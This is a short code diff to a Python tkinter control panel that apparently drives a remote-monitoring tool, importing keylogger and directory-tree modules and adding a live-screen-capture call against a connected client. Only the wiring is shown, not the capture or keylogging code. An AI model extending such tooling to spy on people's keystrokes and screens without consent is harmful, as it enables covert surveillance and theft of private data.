@@ -9,6 +9,7 @@ import numpy as np
 from pynput.keyboard import Listener
 import keylogger_server as kl 
 import directory_tree_server as dt
+import live_screen_server as lss
 
 main = tk.Tk()
 main.geometry("200x200")
@@ -43,6 +44,9 @@ def app_process():
     return
 
 def live_screen():
+    global client
+    lss.capture_screen(client)
+    return
     return
 
 def directory_tree():
